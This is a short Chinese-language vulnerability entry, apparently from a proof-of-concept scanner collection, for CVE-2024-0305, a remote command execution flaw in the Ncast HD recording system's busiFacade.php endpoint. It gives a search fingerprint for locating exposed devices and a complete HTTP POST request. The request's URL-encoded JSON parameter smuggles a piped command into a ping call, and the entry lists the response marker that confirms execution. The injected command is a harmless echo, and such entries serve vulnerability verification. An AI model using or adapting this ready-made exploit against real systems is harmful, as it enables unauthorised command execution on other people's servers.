﻿# Ncast盈可视高清智能录播系统busiFacade RCE漏洞

> 更新时间：2024-01-15

> 漏洞编号：CVE-2024-0305

> 漏洞说明：Ncast盈可视高清智能录播系统是一套新进的音视频录制和播放系统，旨在提供高质量，高清定制的录播功能。该系统/classes/common/busiFacade.php接口存在RCE漏洞，攻击者可以构造恶意命令远控服务器。

> 漏洞特征：app="Ncast-产品" && title=="高清智能录播系统"

> 验证脚本：HTTP

```
POST /classes/common/busiFacade.php HTTP/1.1
Connection: close
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

%7B%22name%22:%22ping%22,%22serviceName%22:%22SysManager%22,%22userTransaction%22:false,%22param%22:%5B%22ping%20127.0.0.1%20%7C%20echo%20dudesuite%22%5D%7D
```

> 响应代码特征：200

> 响应内容特征：dudesuite

> 上传文件定位：


> 验证文件来源：Ncast盈可视高清智能录播系统busiFacade RCE漏洞.poc
